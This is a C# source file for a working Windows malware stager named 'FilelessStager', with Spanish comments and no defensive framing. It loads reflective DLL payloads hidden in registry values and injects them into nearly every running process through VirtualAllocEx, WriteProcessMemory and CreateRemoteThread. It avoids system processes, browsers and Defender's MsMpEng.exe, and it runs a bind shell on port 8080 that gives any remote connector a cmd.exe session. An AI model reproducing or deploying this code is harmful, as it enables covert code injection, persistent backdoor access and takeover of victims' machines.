using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.IO;

namespace FilelessStager
{
    public class Program
    {
        // APIs NATIVAS DE WINDOWS
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool IsWow64Process([In] IntPtr hProcess, [Out] out bool lpSystemInfo);

        // Estructura nativa para escanear procesos
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct PROCESSENTRY32
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExeFile;
        }

        const uint PROCESS_INJECT_ACCESS = 0x043A;
        const uint TH32CS_SNAPPROCESS = 2;
        const string PREFIX = "secreto_";
        const int   BACKDOOR_PORT = 8080;

        // HashSet de PIDs
        static HashSet<uint> injectedPids = new HashSet<uint>();

        public static void Main()
        {
            bool createdNew;
            using (Mutex m = new Mutex(true, "Global\\secreto_stager_mutex", out createdNew))
            {
                if (!createdNew) return;

                // Arrancar bind shell en segundo plano
                Thread tBackdoor = new Thread(EscucharConexiones) { IsBackground = true };
                tBackdoor.Start();

                while (true)
                {
                    try { ExecuteGlobalInjection(); } catch { }
                    Thread.Sleep(150);
                }
            }
        }

        static void ExecuteGlobalInjection()
        {
            byte[] payload64 = (byte[])Registry.LocalMachine.OpenSubKey("SOFTWARE")?.GetValue("secreto_payload");
            byte[] payload86 = (byte[])Registry.LocalMachine.OpenSubKey("SOFTWARE")?.GetValue("secreto_payload_x86");

            if ((payload64 == null || payload64.Length == 0) &&
                (payload86 == null || payload86.Length == 0)) return;

            int loaderOffset64 = (payload64 != null && payload64.Length > 0) ? GetReflectiveLoaderOffset(payload64) : 0;
            int loaderOffset86 = (payload86 != null && payload86.Length > 0) ? GetReflectiveLoaderOffset(payload86) : 0;

            uint currentPid = (uint)Process.GetCurrentProcess().Id;

            HashSet<string> blacklist = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
            {
                "csrss.exe", "dwm.exe", "lsass.exe", "smss.exe", "wininit.exe", "services.exe", "spoolsv.exe",
                "SearchIndexer.exe", "MsMpEng.exe", "MSBuild.exe", "Registry", "Memory Compression",
                "System", "Idle", "svchost.exe", "fontdrvhost.exe", "WmiPrvSE.exe", "WUDFHost.exe", "conhost.exe",
                "iexplore.exe", "msedge.exe", "chrome.exe", "firefox.exe", "SearchHost.exe", "ApplicationFrameHost.exe"
            };

            IntPtr hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap == IntPtr.Zero || hSnap == (IntPtr)(-1)) return;

            PROCESSENTRY32 pe = new PROCESSENTRY32();
            pe.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32));

            if (Process32First(hSnap, ref pe))
            {
                do
                {
                    uint pid = pe.th32ProcessID;

                    if (pid <= 4 || pid == currentPid) continue;
                    if (injectedPids.Contains(pid)) continue;

                    string exeName = pe.szExeFile;
                    if (blacklist.Contains(exeName)) continue;
                    if (exeName.StartsWith(PREFIX, StringComparison.OrdinalIgnoreCase)) continue;

                    IntPtr hProc = OpenProcess(PROCESS_INJECT_ACCESS, false, (int)pid);
                    if (hProc == IntPtr.Zero)
                    {
                        injectedPids.Add(pid);
                        continue;
                    }

                    bool isWow64 = false;
                    IsWow64Process(hProc, out isWow64);

                    byte[] selectedPayload = isWow64 ? payload86 : payload64;
                    int selectedOffset    = isWow64 ? loaderOffset86 : loaderOffset64;

                    if (selectedPayload == null || selectedPayload.Length == 0 || selectedOffset == 0)
                    {
                        injectedPids.Add(pid);
                        CloseHandle(hProc);
                        continue;
                    }

                    // Inyección Reflectiva
                    IntPtr baseAddr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)selectedPayload.Length, 0x3000, 0x40);
                    if (baseAddr != IntPtr.Zero)
                    {
                        if (WriteProcessMemory(hProc, baseAddr, selectedPayload, (uint)selectedPayload.Length, out _))
                        {
                            IntPtr loaderAddr = new IntPtr(baseAddr.ToInt64() + selectedOffset);
                            IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, loaderAddr, baseAddr, 0, IntPtr.Zero);
                            if (hThread != IntPtr.Zero) CloseHandle(hThread);
                        }
                    }

                    injectedPids.Add(pid);
                    CloseHandle(hProc);

                } while (Process32Next(hSnap, ref pe));
            }
            CloseHandle(hSnap);
        }

        static int GetReflectiveLoaderOffset(byte[] dllBytes)
        {
            try
            {
                int e_lfanew = BitConverter.ToInt32(dllBytes, 0x3C);
                // OptionalHeader.Magic: 0x010B = PE32 (x86), 0x020B = PE32+ (x64)
                ushort magic = BitConverter.ToUInt16(dllBytes, e_lfanew + 0x18);
                // ExportDirectory RVA se encuentra en distintos offsets según arquitectura
                int exportDirFieldOffset = (magic == 0x020B) ? (e_lfanew + 0x88) : (e_lfanew + 0x78);
                int exportDirRVA        = BitConverter.ToInt32(dllBytes, exportDirFieldOffset);
                int exportDirOffset     = RvaToOffset(dllBytes, e_lfanew, exportDirRVA);
                int numNames            = BitConverter.ToInt32(dllBytes, exportDirOffset + 0x18);
                int addrOfFunctionsRVA  = BitConverter.ToInt32(dllBytes, exportDirOffset + 0x1C);
                int addrOfNamesRVA      = BitConverter.ToInt32(dllBytes, exportDirOffset + 0x20);
                int addrOfOrdinalsRVA   = BitConverter.ToInt32(dllBytes, exportDirOffset + 0x24);
                int addrOfFunctionsOffset = RvaToOffset(dllBytes, e_lfanew, addrOfFunctionsRVA);
                int addrOfNamesOffset     = RvaToOffset(dllBytes, e_lfanew, addrOfNamesRVA);
                int addrOfOrdinalsOffset  = RvaToOffset(dllBytes, e_lfanew, addrOfOrdinalsRVA);

                for (int i = 0; i < numNames; i++)
                {
                    int nameRVA    = BitConverter.ToInt32(dllBytes, addrOfNamesOffset + (i * 4));
                    int nameOffset = RvaToOffset(dllBytes, e_lfanew, nameRVA);
                    string funcName = "";
                    while (dllBytes[nameOffset] != 0) { funcName += (char)dllBytes[nameOffset]; nameOffset++; }

                    if (funcName == "ReflectiveLoader")
                    {
                        short ordinal = BitConverter.ToInt16(dllBytes, addrOfOrdinalsOffset + (i * 2));
                        int funcRVA   = BitConverter.ToInt32(dllBytes, addrOfFunctionsOffset + (ordinal * 4));
                        return RvaToOffset(dllBytes, e_lfanew, funcRVA);
                    }
                }
            }
            catch { }
            return 0;
        }

        // RvaToOffset
        static int RvaToOffset(byte[] dllBytes, int ntHeadersOffset, int rva)
        {
            short numSections     = BitConverter.ToInt16(dllBytes, ntHeadersOffset + 0x06);
            short optHeaderSize   = BitConverter.ToInt16(dllBytes, ntHeadersOffset + 0x14);
            int sectionHeaderOffset = ntHeadersOffset + 0x18 + optHeaderSize;
            for (int i = 0; i < numSections; i++)
            {
                int virtualAddress  = BitConverter.ToInt32(dllBytes, sectionHeaderOffset + 0x0C);
                int virtualSize     = BitConverter.ToInt32(dllBytes, sectionHeaderOffset + 0x08);
                int pointerToRawData = BitConverter.ToInt32(dllBytes, sectionHeaderOffset + 0x14);
                if (rva >= virtualAddress && rva < virtualAddress + virtualSize) return rva - virtualAddress + pointerToRawData;
                sectionHeaderOffset += 0x28;
            }
            return 0;
        }

        // BIND SHELL

        static void EscucharConexiones()
        {
            TcpListener srv = null;
            try
            {
                srv = new TcpListener(IPAddress.Any, BACKDOOR_PORT);
                srv.Start();

                while (true)
                {
                    try
                    {
                        TcpClient cliente = srv.AcceptTcpClient();
                        Thread t = new Thread(() => ManejarConexion(cliente)) { IsBackground = true };
                        t.Start();
                    }
                    catch { Thread.Sleep(500); }
                }
            }
            catch { }
            finally { try { srv?.Stop(); } catch { } }
        }

        static void ManejarConexion(TcpClient cliente)
        {
            try
            {
                using (cliente)
                using (NetworkStream ns = cliente.GetStream())
                {
                    string shellPath = Path.Combine(Path.GetTempPath(), "secreto_shell.exe");
                    if (!File.Exists(shellPath))
                    {
                        try { File.Copy(Path.Combine(Environment.SystemDirectory, "cmd.exe"), shellPath, false); }
                        catch { shellPath = Path.Combine(Environment.SystemDirectory, "cmd.exe"); }
                    }

                    using (Process shell = new Process())
                    {
                        shell.StartInfo = new ProcessStartInfo(shellPath)
                        {
                            Arguments              = "/Q",
                            CreateNoWindow         = true,
                            UseShellExecute        = false,
                            RedirectStandardInput  = true,
                            RedirectStandardOutput = true,
                            RedirectStandardError  = true,
                        };

                        if (!shell.Start()) return;

                        // stdout → socket
                        Thread tOut = new Thread(() =>
                        {
                            try
                            {
                                byte[] buf = new byte[4096];
                                Stream src = shell.StandardOutput.BaseStream;
                                int n;
                                while ((n = src.Read(buf, 0, buf.Length)) > 0)
                                { ns.Write(buf, 0, n); ns.Flush(); }
                            }
                            catch { }
                        }) { IsBackground = true };

                        // stderr → socket
                        Thread tErr = new Thread(() =>
                        {
                            try
                            {
                                byte[] buf = new byte[4096];
                                Stream src = shell.StandardError.BaseStream;
                                int n;
                                while ((n = src.Read(buf, 0, buf.Length)) > 0)
                                { ns.Write(buf, 0, n); ns.Flush(); }
                            }
                            catch { }
                        }) { IsBackground = true };

                        // socket → stdin; al cerrar la conexión mata el proceso
                        Thread tIn = new Thread(() =>
                        {
                            try
                            {
                                byte[] buf = new byte[4096];
                                Stream dst = shell.StandardInput.BaseStream;
                                int n;
                                while ((n = ns.Read(buf, 0, buf.Length)) > 0)
                                { dst.Write(buf, 0, n); dst.Flush(); }
                            }
                            catch { }
                            try { shell.Kill(); } catch { }
                        }) { IsBackground = true };

                        tOut.Start();
                        tErr.Start();
                        tIn.Start();

                        shell.WaitForExit();
                    }
                }
            }
            catch { }
        }
    }
}